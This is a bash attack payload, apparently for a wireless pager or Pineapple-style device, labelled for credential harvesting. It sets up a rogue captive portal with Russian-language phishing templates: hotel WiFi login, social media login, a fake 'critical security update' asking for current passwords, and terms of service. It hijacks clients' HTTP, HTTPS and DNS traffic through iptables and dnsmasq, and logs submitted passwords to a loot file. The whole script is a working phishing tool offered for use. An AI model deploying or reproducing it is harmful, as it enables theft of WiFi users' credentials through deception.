#!/bin/bash
# Title: Captive Portal
# Author: NullSec
# Description: Creates custom captive portal for credential harvesting
# Category: nullsec/attack

# FIX: UI PATH and fallbacks
export PATH=/usr/sbin:/sbin:/bin:/mmc/usr/sbin:/mmc/usr/bin:$PATH
command -v PROMPT >/dev/null 2>&1 || PROMPT() { echo "$1"; read -p "Press Enter: "; }
command -v ERROR_DIALOG >/dev/null 2>&1 || ERROR_DIALOG() { echo "ERROR: $1" >&2; exit 1; }
command -v LOG >/dev/null 2>&1 || LOG() { echo "[LOG] $1"; }
command -v SPINNER_START >/dev/null 2>&1 || SPINNER_START() { echo "[*] $1"; }
command -v SPINNER_STOP >/dev/null 2>&1 || SPINNER_STOP() { echo "[✓] Done"; }
command -v NUMBER_PICKER >/dev/null 2>&1 || NUMBER_PICKER() { echo "$1"; read -p "Choice: " choice; echo "${choice:-$2}"; }
command -v TEXT_PICKER >/dev/null 2>&1 || TEXT_PICKER() { echo "$1"; read -p "Value: " val; echo "$val"; }
command -v CONFIRMATION_DIALOG >/dev/null 2>&1 || CONFIRMATION_DIALOG() { echo "$1"; read -p "Confirm (y/n): " confirm; [ "$confirm" = "y" ] && echo "0" || echo "1"; }

# Autodetect the right wireless interface (exports $IFACE).
# Falls back to showing the pager error dialog if nothing is plugged in.
. /root/payloads/library/nullsec-iface.sh 2>/dev/null || . "$(dirname "$0")/../../../lib/nullsec-iface.sh"
nullsec_require_iface || exit 1

LOOT_DIR="/mmc/nullsec/captiveportal"
mkdir -p "$LOOT_DIR"

PROMPT "ЗАХВАТ ПОРТАЛА

Создайте пользовательский
портал захвата для сбора
учетных данных.

Функции:
- Множество тем портала
- Пользовательская инъекция HTML
- Логирование учетных данных
- Автопереадресация клиентов
- Отслеживание сессий

ПРЕДУПРЕЖДЕНИЕ: Атака социальной инженерии

Нажмите OK для настройки."

# Check dependencies
MISSING=""
command -v uhttpd >/dev/null 2>&1 || MISSING="${MISSING}uhttpd "
command -v iptables >/dev/null 2>&1 || MISSING="${MISSING}iptables "

if [ -n "$MISSING" ]; then
    ERROR_DIALOG "Отсутствующие инструменты:
$MISSING

Установите с помощью opkg."
    exit 1
fi

# Find AP interface
AP_IFACE=""
for i in $IFACE wlan1 br-lan; do
    if iwinfo "$i" info 2>/dev/null | grep -q "Режим: Master"; then
        AP_IFACE="$i"
        break
    fi
done
[ -z "$AP_IFACE" ] && AP_IFACE="$IFACE"

PORTAL_IP=$(ip addr show "$AP_IFACE" | grep "inet " | awk '{print $2}' | cut -d'/' -f1)
PORTAL_IP=${PORTAL_IP:-"172.16.42.1"}

PROMPT "ШАБЛОН ПОРТАЛА:

1. Вход в WiFi (отель)
2. Вход в социальные сети
3. Обновление ПО
4. Условия и положения
5. Пользовательский HTML

Выберите шаблон далее."

TEMPLATE=$(NUMBER_PICKER "Шаблон (1-5):" 1)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) TEMPLATE=1 ;; esac

PORTAL_DIR="/tmp/captive_portal_$$"
mkdir -p "$PORTAL_DIR"

# Generate portal HTML based on template
case $TEMPLATE in
    1) PORTAL_TITLE="Доступ к WiFi - Пожалуйста, войдите"
       PORTAL_FIELDS='<input type="text" name="email" placeholder="Адрес электронной почты" required>
<input type="password" name="password" placeholder="Пароль" required>'
       PORTAL_BUTTON="Подключиться к WiFi"
       ;;
    2) PORTAL_TITLE="Подтвердите свою учетную запись"
       PORTAL_FIELDS='<input type="text" name="username" placeholder="Имя пользователя" required>
<input type="password" name="password" placeholder="Пароль" required>'
       PORTAL_BUTTON="Войти"
       ;;
    3) PORTAL_TITLE="Критическое обновление безопасности"
       PORTAL_FIELDS='<input type="text" name="email" placeholder="Электронная почта" required>
<input type="password" name="password" placeholder="Текущий пароль" required>
<input type="password" name="new_password" placeholder="Новый пароль" required>'
       PORTAL_BUTTON="Обновить сейчас"
       ;;
    4) PORTAL_TITLE="Условия обслуживания"
       PORTAL_FIELDS='<input type="text" name="name" placeholder="Полное имя" required>
<input type="text" name="email" placeholder="Электронная почта" required>
<input type="checkbox" name="agree" required> Я согласен с условиями'
       PORTAL_BUTTON="Принять и подключиться"
       ;;
    5) PORTAL_TITLE=$(TEXT_PICKER "Заголовок страницы:" "Вход")
       case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) PORTAL_TITLE="Вход" ;; esac
       PORTAL_FIELDS='<input type="text" name="username" placeholder="Имя пользователя" required>
<input type="password" name="password" placeholder="Пароль" required>'
       PORTAL_BUTTON="Отправить"
       ;;
esac

PORTAL_PORT=$(NUMBER_PICKER "Порт портала:" 80)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) PORTAL_PORT=80 ;; esac

resp=$(CONFIRMATION_DIALOG "ЗАПУСТИТЬ ЗАХВАТ ПОРТАЛА?

Шаблон: $TEMPLATE
Заголовок: $(echo "$PORTAL_TITLE" | head -c 25)
Порт: $PORTAL_PORT
Интерфейс: $AP_IFACE
IP: $PORTAL_IP

Клиенты будут
перенаправлены на портал.

Подтвердить?")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

SPINNER_START "Создание портала..."

TIMESTAMP=$(date +%Y%m%d_%H%M)
CRED_FILE="$LOOT_DIR/creds_$TIMESTAMP.log"
touch "$CRED_FILE"

# Create index page
cat > "$PORTAL_DIR/index.html" << HTMLEOF
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>$PORTAL_TITLE</title>
<style>
body{font-family:Arial,sans-serif;background:#f0f2f5;margin:0;padding:20px}
.container{max-width:400px;margin:40px auto;background:#fff;border-radius:8px;padding:30px;box-shadow:0 2px 10px rgba(0,0,0,.1)}
h2{text-align:center;color:#1a73e8;margin-bottom:20px}
input[type="text"],input[type="password"],input[type="email"]{width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box}
button{width:100%;padding:12px;background:#1a73e8;color:#fff;border:none;border-radius:4px;cursor:pointer;font-size:16px;margin-top:10px}
button:hover{background:#1557b0}
.footer{text-align:center;color:#666;font-size:12px;margin-top:20px}
</style>
</head>
<body>
<div class="container">
<h2>$PORTAL_TITLE</h2>
<form method="POST" action="/capture">
$PORTAL_FIELDS
<button type="submit">$PORTAL_BUTTON</button>
</form>
<div class="footer">Безопасное соединение &bull; Защищено</div>
</div>
</body>
</html>
HTMLEOF

# Create CGI capture script
mkdir -p "$PORTAL_DIR/cgi-bin"
cat > "$PORTAL_DIR/cgi-bin/capture" << 'CGIEOF'
#!/bin/sh
echo "Content-Type: text/html"
echo ""

# Read POST data
read POST_DATA

# Log credentials with timestamp
TIMESTAMP=$(date '+%Y-%m-%d %H:%M:%S')
CLIENT_IP="$REMOTE_ADDR"
echo "$TIMESTAMP | $CLIENT_IP | $POST_DATA" >> CRED_FILE_PLACEHOLDER

echo "<html><body><h2>Подключено!</h2><p>Пожалуйста, подождите, пока мы настроим ваше соединение...</p>"
echo "<script>setTimeout(function(){window.location='http://www.google.com';},5000);</script>"
echo "</body></html>"
CGIEOF
sed -i "s|CRED_FILE_PLACEHOLDER|$CRED_FILE|g" "$PORTAL_DIR/cgi-bin/capture"
chmod +x "$PORTAL_DIR/cgi-bin/capture"

# Create success redirect
cat > "$PORTAL_DIR/success.html" << 'SEOF'
<!DOCTYPE html>
<html><body><h2>Подключено!</h2><p>Перенаправление...</p>
<script>setTimeout(function(){window.location='http://www.google.com';},3000);</script>
</body></html>
SEOF

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Set up iptables redirect for DNS and HTTP
iptables -t nat -A PREROUTING -i "$AP_IFACE" -p tcp --dport 80 -j DNAT --to-destination "$PORTAL_IP:$PORTAL_PORT" 2>/dev/null
iptables -t nat -A PREROUTING -i "$AP_IFACE" -p tcp --dport 443 -j DNAT --to-destination "$PORTAL_IP:$PORTAL_PORT" 2>/dev/null
iptables -t nat -A PREROUTING -i "$AP_IFACE" -p udp --dport 53 -j DNAT --to-destination "$PORTAL_IP:53" 2>/dev/null

# Start web server
uhttpd -p "$PORTAL_IP:$PORTAL_PORT" -h "$PORTAL_DIR" -c /cgi-bin -f 2>/dev/null &
HTTPD_PID=$!

# Start DNS redirect (all DNS queries -> portal IP)
if command -v dnsmasq >/dev/null 2>&1; then
    echo "address=/#/$PORTAL_IP" > /tmp/captive_dns.conf
    dnsmasq -C /tmp/captive_dns.conf --no-daemon --no-resolv --no-hosts -p 5353 2>/dev/null &
    DNS_PID=$!
fi

SPINNER_STOP

LOG "Портал захвата активен на $PORTAL_IP:$PORTAL_PORT"

PROMPT "ПОРТАЛ ЗАХВАТА АКТИВЕН!

Портал: $PORTAL_IP:$PORTAL_PORT
Шаблон: $TEMPLATE
Интерфейс: $AP_IFACE

Учетные данные логируются в:
$CRED_FILE

Нажмите OK для мониторинга.
Нажмите OK снова для остановки."

# Monitor loop
while true; do
    CRED_COUNT=0
    [ -f "$CRED_FILE" ] && CRED_COUNT=$(wc -l < "$CRED_FILE" | tr -d ' ')
    LAST_ENTRY=$(tail -1 "$CRED_FILE" 2>/dev/null | head -c 50)

    resp=$(CONFIRMATION_DIALOG "МОНИТОР ПОРТАЛА

Учетные данные: $CRED_COUNT
Последний: $LAST_ENTRY

Продолжить мониторинг?")
    [ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && break
    sleep 5
done

# Cleanup
SPINNER_START "Остановка портала..."
kill $HTTPD_PID 2>/dev/null
kill $DNS_PID 2>/dev/null
iptables -t nat -D PREROUTING -i "$AP_IFACE" -p tcp --dport 80 -j DNAT --to-destination "$PORTAL_IP:$PORTAL_PORT" 2>/dev/null
iptables -t nat -D PREROUTING -i "$AP_IFACE" -p tcp --dport 443 -j DNAT --to-destination "$PORTAL_IP:$PORTAL_PORT" 2>/dev/null
iptables -t nat -D PREROUTING -i "$AP_IFACE" -p udp --dport 53 -j DNAT --to-destination "$PORTAL_IP:53" 2>/dev/null
rm -rf "$PORTAL_DIR" /tmp/captive_dns.conf
SPINNER_STOP

CRED_TOTAL=0
[ -f "$CRED_FILE" ] && CRED_TOTAL=$(wc -l < "$CRED_FILE" | tr -d ' ')

PROMPT "ПОРТАЛ ОСТАНОВЛЕН

Всего учетных данных: $CRED_TOTAL

Сохранено в:
$CRED_FILE

Нажмите OK для выхода."
